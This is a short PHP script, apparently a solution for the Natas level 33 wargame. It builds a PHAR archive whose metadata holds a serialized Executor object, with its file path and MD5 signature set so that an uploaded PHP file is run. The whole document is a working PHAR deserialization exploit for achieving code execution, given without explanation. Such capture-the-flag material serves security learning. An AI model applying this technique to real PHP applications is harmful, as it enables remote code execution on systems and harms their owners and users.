<?php
	class Executor {
	private $filename = "/natas33/upload/natas34.php"; 
        private $signature = "05b5d10138ead0663fc142475e246cd8";
	}

	$obj = new Executor();
	$phar = new Phar("natas34.phar");
	$phar->startBuffering();
	$phar->setStub("<?php __HALT_COMPILER(); ?>");
	$phar->setMetadata($obj);
	$phar->stopBuffering();
?>
